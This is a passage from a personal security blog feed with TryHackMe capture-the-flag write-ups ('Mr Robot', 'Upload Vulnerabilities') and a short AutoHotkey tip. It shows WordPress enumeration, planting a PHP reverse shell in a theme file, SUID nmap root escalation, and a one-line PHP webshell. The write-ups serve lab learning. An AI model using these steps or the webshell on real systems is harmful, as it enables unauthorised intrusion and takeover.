</span></span><span class="line"><span class="cl">/0                    <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/0/<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/admin/<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/atom                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/atom/<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/audio                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/audio/<span class="o">]</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/blog                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 234<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/blog/<span class="o">]</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 233<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/css/<span class="o">]</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/dashboard            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span class="o">]</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/favicon.ico          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                      
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/feed                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span class="o">]</span>     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/image                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/image/<span class="o">]</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/Image                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/Image/<span class="o">]</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 236<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/images/<span class="o">]</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1188<span class="o">]</span>                                   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/<span class="o">]</span>          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/intro                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 516314<span class="o">]</span>                                 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 232<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/js/<span class="o">]</span>     
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/license              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 309<span class="o">]</span>                                    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/login                <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/page1                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/<span class="o">]</span>            
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/phpmyadmin           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 94<span class="o">]</span>                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/readme               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 64<span class="o">]</span>                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/rdf                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/rdf/<span class="o">]</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/robots               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 41<span class="o">]</span>                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 41<span class="o">]</span>                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/rss                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span class="o">]</span>       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/rss2                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/feed/<span class="o">]</span>       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/sitemap              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/sitemap.xml          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/video                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 235<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/video/<span class="o">]</span>    
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-admin             <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 238<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-admin/<span class="o">]</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-content           <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 240<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-content/<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-includes          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 241<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-includes/<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-cron              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-config            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-links-opml        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 227<span class="o">]</span>                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-load              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-login             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2613<span class="o">]</span>                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-mail              <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 3064<span class="o">]</span>                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-settings          <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span>                                          
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/wp-signup            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; http://&lt;target-ip&gt;/wp-login.php?action<span class="o">=</span>register<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/xmlrpc               <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42<span class="o">]</span>                                                       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/xmlrpc.php           <span class="o">(</span>Status: 405<span class="o">)</span> <span class="o">[</span>Size: 42<span class="o">]</span>                                                       
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2022/05/10 12:24:21 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>From this, we can be confident that WordPress is installed. This also mirrors what <a href="">Wappalyzer</a> tells us about the server&rsquo;s WordPress installation. Let&rsquo;s investigate some of the more interesting results from our <code>gobuster</code> scan.</p>
<p>Visiting <code>http://&lt;target-ip&gt;/robots.txt</code> yields:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">User-agent: *
</span></span><span class="line"><span class="cl">fsocity.dic
</span></span><span class="line"><span class="cl">key-1-of-3.txt
</span></span></code></pre></div><p><code>fsocity.dic</code> is a dictionary wordlist file with many entries. This most likely contains the username and/or password of the WordPress installation.</p>
<p><code>key-1-of-3.txt</code> has our first flag.</p>
<p><code>http://&lt;target-ip&gt;/license</code> gives us a text file with the following string hidden at the bottom. At first flance, the string looks a lot like <code>base64</code>, so let us try to convert it. This could be done via websites like <a href="https://www.base64decode.org/">www.base64.decode.org</a>, but I already had Burp Suite open. It works:</p>
<p><img src="/images/mr-robot/mr-robot-burp-decode.png" alt="mr-robot-burp-decode"></p>
<p>and gives us a <code>user:password</code> combination.</p>
<p>Looking through our <code>gobuster</code> results, we see <code>http://&lt;target-ip&gt;/wp-login.php</code>, which takes us to a WordPress log-in form. Using the credentials we have just discovered, we log in to the administrator panel.</p>
<p>As WordPress is a multi-media content management system, it should not be too difficult for us to figure out a way to upload a file that will give us RCE (remote code execution). In the past, we have used <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentestmonkey&rsquo;s PHP reverse shell script</a>.</p>
<p>Unfortunately, the native WordPress media uploader function does not allow us to upload <code>.php</code> files &ldquo;for security reasons.&rdquo; The form won&rsquo;t accept any variants like <code>.php2</code> either.</p>
<p>However, we know that WordPress relies on the execution of <code>.php</code> files to carry out work properly. Thus, we can simply use the platform&rsquo;s built-in text editor to replace the contents of an existing <code>.php</code> WordPress page with our reverse shell script. I went ahead and used <code>404.php</code>, as it is easily accessible and, honestly, it&rsquo;s just at the top of the list.</p>
<p><img src="/images/mr-robot/mr-robot-ptm.png" alt="mr-robot-ptm"></p>
<p>That worked nicely! We can then stabilize our shell via python with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ python -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">daemon@linux:/$ 
</span></span></code></pre></div><p>and explore:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">daemon@linux:/$ ls
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
</span></span><span class="line"><span class="cl">boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
</span></span><span class="line"><span class="cl">daemon@linux:/$ <span class="nb">cd</span> home 
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> home
</span></span><span class="line"><span class="cl">daemon@linux:/home$ ls
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">robot
</span></span><span class="line"><span class="cl">daemon@linux:/home$ <span class="nb">cd</span> robot
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> robot
</span></span><span class="line"><span class="cl">daemon@linux:/home/robot$ ls
</span></span><span class="line"><span class="cl">ls
</span></span><span class="line"><span class="cl">key-2-of-3.txt	password.raw-md5
</span></span><span class="line"><span class="cl">daemon@linux:/home/robot$ ls -la
</span></span><span class="line"><span class="cl">ls -la
</span></span><span class="line"><span class="cl">total <span class="m">16</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root  <span class="m">4096</span> Nov <span class="m">13</span>  <span class="m">2015</span> ..
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> robot robot   <span class="m">33</span> Nov <span class="m">13</span>  <span class="m">2015</span> key-2-of-3.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> robot robot   <span class="m">39</span> Nov <span class="m">13</span>  <span class="m">2015</span> password.raw-md5
</span></span></code></pre></div><p>We can&rsquo;t read <code>key-2-of-3.txt</code> yet, but we can access <code>password.raw-md5</code> for a hashed version of a password, likely for the <code>robot</code> user. We can use <a href="https://crackstation.net/">crackstation.net</a> to crack it, and, if not, probaby <a href="https://www.openwall.com/john/">John the Ripper</a>.</p>
<p>Luckily, crackstation.net recognizes the hash and gives us the decoded password:</p>
<p><img src="/media/mr-robot-crackstation.png" alt="mr-robot-crackstation"></p>
<p>We can now switch users (<code>su</code>) to <code>robot</code> and read <code>key-2-of-3.txt</code>. Now that we have gotten the second flag, let&rsquo;s look to escalate our privileges for <code>root</code> access and, presumably, the third flag.</p>
<p>As a shortcut to obtaining root access, We can search for system files that have an SUID (Set User ID) bit set. Files with SUID bits allow them to run with the permissions of whomever the owner of the file is. If the owner happens to be <code>root</code>, it runs with root permissions.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">robot@linux:/tmp$ find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">find / -perm -u<span class="o">=</span>s -type f 2&gt;/dev/null
</span></span><span class="line"><span class="cl">/bin/ping
</span></span><span class="line"><span class="cl">/bin/umount
</span></span><span class="line"><span class="cl">/bin/mount
</span></span><span class="line"><span class="cl">/bin/ping6
</span></span><span class="line"><span class="cl">/bin/su
</span></span><span class="line"><span class="cl">/usr/bin/passwd
</span></span><span class="line"><span class="cl">/usr/bin/newgrp
</span></span><span class="line"><span class="cl">/usr/bin/chsh
</span></span><span class="line"><span class="cl">/usr/bin/chfn
</span></span><span class="line"><span class="cl">/usr/bin/gpasswd
</span></span><span class="line"><span class="cl">/usr/bin/sudo
</span></span><span class="line"><span class="cl">/usr/local/bin/nmap
</span></span><span class="line"><span class="cl">/usr/lib/openssh/ssh-keysign
</span></span><span class="line"><span class="cl">/usr/lib/eject/dmcrypt-get-device
</span></span><span class="line"><span class="cl">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
</span></span><span class="line"><span class="cl">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
</span></span><span class="line"><span class="cl">/usr/lib/pt_chown
</span></span></code></pre></div><p>We see that <code>nmap</code> in <code>/usr/local/bin/nmap</code>, interestingly, has an SUID bit set. Nice.</p>
<p>By checking <a href="https://gtfobins.github.io/gtfobins/nmap/#suid">GTFOBins</a> for <code>nmap</code> SUID escalations, we see that we can invoke <code>nmap</code>&rsquo;s &ldquo;interactive mode&rdquo; (available on versions 2.02 to 5.21, which can be used to execute shell commands via <code>nmap&gt; !sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">robot@linux:/$ /usr/local/bin/nmap --interactive
</span></span><span class="line"><span class="cl">/usr/local/bin/nmap --interactive
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Starting nmap V. 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
</span></span><span class="line"><span class="cl">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="k">for</span> <span class="nb">help</span>
</span></span><span class="line"><span class="cl">nmap&gt; !/bin/sh
</span></span><span class="line"><span class="cl">!/bin/sh
</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
</span></span><span class="line"><span class="cl">whoami
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl"><span class="c1"># </span>
</span></span></code></pre></div><p>&hellip;<em>et voilà</em>! We have root access and, by extension, the third flag.</p>
<h3 id="notes">Notes</h3>
<p>In retrospect, I would&rsquo;ve checked my Wappalyzer browser plug-in earlier, which is a good practice to prioritize. It would have spotted that WordPress is installed on the server before the lengthy <code>gobuster</code> scan, potentially saving time.</p>
<p>Otherwise, this was an enjoyable CTF machine, especially for fans of the show.</p>
]]></content>
        </item>
        
        <item>
            <title>How to: Add a backtick hotkey to Windows 10</title>
            <link>https://robscharf.github.io/posts/2022/05/how-to-add-a-backtick-hotkey-to-windows-10/</link>
            <pubDate>Tue, 03 May 2022 13:00:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/05/how-to-add-a-backtick-hotkey-to-windows-10/</guid>
            <description>Lately I have been really enjoying Obsidian as a personal knowledge base. It uses simple Markdown files, which makes maintaining synchronized cross-platform access easy and low impact.
The problem I recently ran into a small problem when I decided to change my workflow to run Obsidian on my Windows PC host machine, instead of inside my Kali or Ubuntu virtual machines. Until now, I have largely been running Obsidian on my Macbook and inside my working machines on my PC.</description>
            <content type="html"><![CDATA[<p>Lately I have been really enjoying <a href="https://obsidian.md/">Obsidian</a> as a personal knowledge base. It uses simple <code>Markdown</code> files, which makes maintaining synchronized cross-platform access easy and low impact.</p>
<h3 id="the-problem">The problem</h3>
<p>I recently ran into a small problem when I decided to change my workflow to run Obsidian on my Windows PC host machine, instead of inside my Kali or Ubuntu virtual machines. Until now, I have largely been running Obsidian on my Macbook and inside my working machines on my PC. However, when I went to start my first <code>.md</code> in Windows, I quickly realized that my 65% keyboard lacks a <code>`</code> / <code>~</code> key. Not being able to type backticks, and thus write <code>code</code> blocks, would make my markdown adventures a lot less convenient.</p>
<h3 id="the-solution">The Solution</h3>
<p>Adding a hotkey mapping in Windows 10 is surprisngly easy, thanks to <a href="https://www.autohotkey.com/">AutoHotkey</a>. The AutoHotkey software is fully open-source and <a href="https://autohotkey.com/foundation/history.html">maintained by a non-profit foundation</a>.</p>
<p>To add a backtick hotkey, simply create an <code>.ahk</code> file and fill it with the following line:</p>
<pre tabindex="0"><code>^&#39;::Send ```
</code></pre><p><strong>Note:</strong> three <code>```</code> characters are needed, as the backtick ( <code>`</code> ) is the primary escape character in AutoHotkey scripts.</p>
<p>You now have an executable AutoHotkey script. If you place this file in the <code>C:\Users\&lt;your-username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> directory, it will execute whenever Windows is started.</p>
]]></content>
        </item>
        
        <item>
            <title>THM: Upload Vulnerabilities -- Write-Up</title>
            <link>https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities--write-up/</link>
            <pubDate>Thu, 28 Apr 2022 11:30:00 +0000</pubDate>
            
            <guid>https://robscharf.github.io/posts/2022/04/thm-upload-vulnerabilities--write-up/</guid>
            <description>Welcome to my write-up of the Upload Vulnerabilities room on TryHackMe, created by MuirlandOracle. Let&amp;rsquo;s jump in.
Note: The Complete Beginner THM skill path is now considered depricated in favor of the Jr Penetration Tester path.
Task 1 - Getting Started The room begins with a necessary configuration step. The hosts file of the attacking machine needs to be modified to include the following line:
&amp;lt;machine-ip&amp;gt; overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.</description>
            <content type="html"><![CDATA[<p>Welcome to my write-up of the <a href="https://tryhackme.com/room/uploadvulns">Upload Vulnerabilities</a> room on <a href="https://tryhackme.com/">TryHackMe</a>, created by <a href="https://tryhackme.com/p/MuirlandOracle">MuirlandOracle</a>. Let&rsquo;s jump in.</p>
<p><strong>Note:</strong> The <a href="https://tryhackme.com/paths">Complete Beginner</a> THM skill path is now considered <em>depricated</em> in favor of the <a href="https://tryhackme.com/path-action/jrpenetrationtester/join">Jr Penetration Tester</a> path.</p>
<h2 id="task-1---getting-started">Task 1 - Getting Started</h2>
<p>The room begins with a necessary configuration step. The <code>hosts</code> file of the attacking machine needs to be modified to include the following line:</p>
<p><code>&lt;machine-ip&gt;    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm</code></p>
<p>Note: You will require administrator-level privileges when editing the file. This can be done via <code>sudo</code> on Linux and <code>Run as Administrator</code> on Windows.</p>
<p>The <code>hosts</code> file can be found at <code>/etc/hosts</code> on Linux and at <code>C:\Windows\System32\drivers\etc\hosts</code> on Windows.</p>
<h2 id="task-2---introduction">Task 2 - Introduction</h2>
<p>This task provides context for our task of exploiting vulnerable file upload systems on the web, outlining some of the opportunities for malicious actors. The text explains that the purpose of this THM room is to &ldquo;explore some of the vulnerabilities resulting from improper (or inadequate) handling of file uploads.&rdquo;</p>
<p>This includes:</p>
<ul>
<li>Overwriting existing files on a server</li>
<li>Uploading and Executing Shells on a server</li>
<li>Bypassing Client-side filtering</li>
<li>Bypassing various kinds of Server-side filtering</li>
<li>Fooling content type validation checks</li>
</ul>
<h2 id="task-3---general-methodology">Task 3 - General Methodology</h2>
<p>As the title indicates, additional information is provided through this task on how upload vulnerabilities are exploited.</p>
<blockquote>
<p>As with any kind of hacking, enumeration is key. The more we understand about our environment, the more we&rsquo;re able to do with it. Looking at the source code for the page is good to see if any kind of client-side filtering is being applied.</p>
</blockquote>
<p>The text mentions several relevant tools for this endeavor, including <a href="https://github.com/OJ/gobuster">Gobuster</a>, <a href="">BurpSuite</a>, and <a href="https://www.wappalyzer.com/apps">WappAnalyzer</a>.</p>
<h2 id="task-4---overwriting-existing-files">Task 4 - Overwriting Existing Files</h2>
<p>With properly configured permissions, servers that accept file uploads will ensure that newly uploaded files will not overwrite existing ones and that standard web visitors will not be able to maliciously alter web pages or server functions.</p>
<p>An example is then presented, involving a webpage with file upload capabilities. By inspecting the page&rsquo;s source code, we can see that: a) uploaded images are likely stored in the servers <code>/images</code> directory, and that there is an existing file (displayed on the home page) called <code>spaniel.jpg</code>. A new <code>spaniel.jpg</code> image is then uploaded, which overwrites the original.</p>
<h4 id="question-41">Question 4.1</h4>
<h5 id="what-is-the-name-of-the-image-file-which-can-be-overwritten">What is the name of the image file which can be overwritten?</h5>
<p>After navigating to <code>overwrite.uploadvulns.thm</code>, we can view the page&rsquo;s source code to learn about the upload destination and image displayed on the page, just like in the example provided.</p>
<p><img src="/images/uv/uv-task4.png" alt="uv-task4"></p>
<h4 id="question-42">Question 4.2</h4>
<h5 id="overwrite-the-image-what-is-the-flag-you-receive">Overwrite the image. What is the flag you receive?</h5>
<p><img src="/images/uv/uv-task4-2.png" alt="uv-task4-2"></p>
<h2 id="task-5---remote-code-execution">Task 5 - Remote Code Execution</h2>
<p>There are two primary methods for achieving Remote Code Execution (RCE)</p>
<ol>
<li>Webshells</li>
<li>Reverse Shells</li>
</ol>
<h3 id="methodology">Methodology</h3>
<h4 id="webshells">Webshells</h4>
<p>For a given webpage with upload form, run something like a <a href="">GoBuster</a> scan on <code>dir</code> mode, using a relevant wordlist with <code>-w</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster dir -u http://uploadform.com -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt
</span></span></code></pre></div><p>If a directory is found that can plausibly house uploads from the web form, an uploaded webshell can be reached via the browser. If, as in the example, the server is running PHP, then a simple webshell can be invoked via:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;cmd&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>From this point, system files can be read and/or attempts to upgrade the webshell to a remote shell.</p>
<h4 id="remote-shell">Remote Shell</h4>
<p>After editing and uploading the necessary reverse shell script, such as <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">Pentest Monkey&rsquo;s 2007 PHP tool</a>, the attacking machine can invoke a <code>netcat</code> listener via the venerable</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">4444</span>
</span></span></code></pre></div><p>The shell script will be activated by navigating to the uploaded shell&rsquo;s location on the server with a browser. This will give the attacker RCE capabillities on the target server, though ideally the reverse shell would then be stabilized with user privileges escalated.</p>
<h4 id="question-51">Question 5.1</h4>
<h5 id="run-a-gobuster-scan-on-the-website-using-the-syntax-from-the-screenshot-above-what-directory-looks-like-it-might-be-used-for-uploads">Run a Gobuster scan on the website using the syntax from the screenshot above. What directory looks like it might be used for uploads?</h5>
<p>Running:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">gobuster dir -u shell.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
</span></span></code></pre></div><p>creates the following output:</p>
<p><img src="/images/uv/uv-gobuster.png" alt="UV - Gobuster"></p>
<h4 id="question-52">Question 5.2</h4>
<h5 id="get-either-a-web-shell-or-a-reverse-shell-on-the-machine-whats-the-flag-in-the-varwww-directory-of-the-server">Get either a web shell or a reverse shell on the machine. What&rsquo;s the flag in the /var/www/ directory of the server?</h5>
<p>After editing and uploading the aforementioned Pentest Monkey PHP script, we instantiate the <code>netcat</code> listener</p>
<p><img src="/images/uv/uv-ncl.png" alt="ncl"></p>
<p>When we navigate to our uploaded ptm script at <code>http://shell.uploadvulns.thm/resources/ptm-shell.php</code>, we are greeted with</p>
<p><img src="/images/uv/uv-504.png" alt="uv-504"></p>
<p>However, our <code>netcat</code> listener has picked up the reverse shell!</p>
<p><img src="/images/uv/uv-rce.png" alt="uv-rce"></p>
<p>Then we simply navigate to the <code>/var/www</code> directory to find the flag.</p>
<p><img src="/images/uv/uv-flag.png" alt="uv-flag"></p>
<h2 id="task-6---filtering">Task 6 - Filtering</h2>
<p>This task introduces the notion that, thus far, we have not encountered any form of security measures that have been implemented by developers to mitigate the effects of would-be file upload vulnerabilities. In this task, we begin to consider the relevant security mechanisms and how to circumvent them.</p>
<p>Our first focus will be on the concept of <em>filtering</em>, that is, attempts to prevent unintended files from being successfully uploaded to the server. This is accomplished through two primary approaches:</p>
<h3 id="client-side-vs-server-side">Client-side vs. Server-side</h3>
<h4 id="client-side-filtering">Client-side filtering</h4>
<blockquote>
<p>When we talk about a script being &ldquo;Client-Side&rdquo;, in the context of web applications, we mean that it&rsquo;s running in the user&rsquo;s browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on our computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.</p>
</blockquote>
<h4 id="server-side-filtering">Server-side filtering</h4>
<blockquote>
<p>Conversely, as you may have guessed, a server-side script will be run on the server. Traditionally PHP was the predominant server-side language (with Microsoft&rsquo;s ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don&rsquo;t have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.</p>
</blockquote>
<p>Next, we look at some common methods for filtering.</p>
<h3 id="filtering-mechanisms">Filtering Mechanisms</h3>
<h4 id="extension-validation">Extension Validation</h4>
<p>While file extensions theoretically identify the contents of a file, in reality they are easy to change, thus making them highly unreliable. While Windows still uses them to identify file types, Unix systems usually rely on other methods. Extension filters conventionally operate by blacklisting unwanted extensions or whitelisting allowed extensions.</p>
